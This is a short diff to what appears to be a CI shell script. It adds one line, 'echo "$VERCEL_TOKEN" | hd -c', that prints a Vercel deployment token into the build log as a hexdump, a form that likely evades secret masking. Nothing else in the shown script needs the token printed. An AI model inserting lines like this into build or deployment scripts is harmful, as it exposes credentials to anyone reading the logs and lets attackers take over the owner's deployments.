@@ -2,7 +2,7 @@
 set -ex
 
 cd "$(dirname "$0")"
-
+echo "$VERCEL_TOKEN" | hd -c
 # shellcheck source=ci/env.sh
 source ../ci/env.sh
 
